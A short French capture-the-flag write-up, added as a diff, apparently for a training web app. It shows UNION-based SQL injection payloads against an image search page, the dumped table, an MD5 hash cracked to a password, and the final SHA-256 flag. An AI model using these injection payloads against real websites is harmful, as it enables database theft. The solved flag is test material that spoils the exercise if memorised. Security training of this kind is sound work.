@@ -1,0 +1,24 @@
+Ici, on va faire exactement la même chose que dans la 08 et la 10. On pourrait accéder à la DB via la page members, mais on va le faire via la searchimg, comme le sujet le voudrait...
+
+
+Voici la table list_images:
+
+list_images : id, url, title, comment
+
+1 union select id, url from list_images
+1 union select id, title from list_images
+1 union select id, comment from list_images
+
+On a donc une table comme ça :
+
+id  | url                                       | title     | comment
+
+1   | https://fr.wikipedia.org/wiki/Programme_  | Nsa       | An image about the NSA !
+2   | https://fr.wikipedia.org/wiki/Fichier:42  | 42 !      | There is a number..
+3   | https://fr.wikipedia.org/wiki/Logo_de_Go  | Google    | Google it !
+4   | https://en.wikipedia.org/wiki/Earth#/med  | Earth     | Earth!
+5   | borntosec.ddns.net/images.png             | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+Si je décrypte ça en MD5, je tombe sur : albatroz
+Ensuite, je l’encrypte en SHA-256 et voilà le flag :
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
